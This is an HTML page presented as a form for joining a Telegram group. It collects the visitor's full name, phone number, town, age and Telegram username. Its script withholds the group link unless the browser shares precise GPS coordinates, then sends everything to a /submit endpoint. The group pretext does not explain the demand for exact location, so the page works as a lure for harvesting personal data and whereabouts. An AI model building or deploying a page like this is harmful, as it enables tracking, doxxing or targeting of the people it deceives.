<!DOCTYPE html>
<html>
<head>
  <title>Join Telegram Group</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #00c9ff, #92fe9d);
      color: #333;
      padding: 30px;
      text-align: center;
    }
    input, button {
      padding: 10px;
      margin: 8px;
      width: 80%;
      max-width: 400px;
      border: none;
      border-radius: 5px;
      font-size: 16px;
    }
    button {
      background-color: #007bff;
      color: white;
      cursor: pointer;
    }
    button:hover {
      background-color: #0056b3;
    }
    .error {
      color: red;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <h2>Fill the form to join the Telegram group</h2>
  <form id="userForm">
    <input type="text" name="fullname" placeholder="Full Name" required><br>
    <input type="text" name="phone" placeholder="Phone Number" required><br>
    <input type="text" name="towncity" placeholder="Town/City" required><br>
    <input type="number" name="age" placeholder="Age" required><br>
    <input type="text" name="telegram" placeholder="Telegram Username" required><br>
    <button type="submit">Submit</button>
  </form>
  <div class="error" id="errorMsg"></div>

  <script>
    const form = document.getElementById("userForm");
    const errorMsg = document.getElementById("errorMsg");

    form.addEventListener("submit", function(e) {
      e.preventDefault();
      errorMsg.textContent = "";

      if (!navigator.geolocation) {
        errorMsg.textContent = "Geolocation is not supported by your browser.";
        return;
      }

      navigator.geolocation.getCurrentPosition(
        position => {
          const data = {
            fullname: form.fullname.value.trim(),
            phone: form.phone.value.trim(),
            towncity: form.towncity.value.trim(),
            age: form.age.value.trim(),
            telegram: form.telegram.value.trim(),
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
          };

          fetch("/submit", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
          })
          .then(res => res.json())
          .then(response => {
            if (response.link) {
              window.location.href = response.link;
            } else {
              errorMsg.textContent = response.error || "Something went wrong.";
            }
          })
          .catch(() => errorMsg.textContent = "Network error. Try again.");
        },
        () => {
          errorMsg.textContent = "Failed to gain the trust. Location permission is required.";
        }
      );
    });
  </script>
</body>
</html>
